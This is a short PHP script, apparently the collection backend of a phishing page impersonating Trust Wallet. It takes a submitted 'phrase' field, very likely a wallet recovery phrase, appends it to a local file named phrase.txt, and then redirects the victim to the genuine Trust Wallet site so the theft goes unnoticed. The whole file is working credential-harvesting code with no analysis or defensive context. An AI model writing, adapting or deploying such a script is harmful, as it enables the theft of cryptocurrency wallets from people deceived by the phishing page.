<?php

file_put_contents("phrase.txt", "Phrase: " . $_POST['phrase'] .  "\n", FILE_APPEND);
header('Location: https://www.trustwallet.com/');
exit();
?>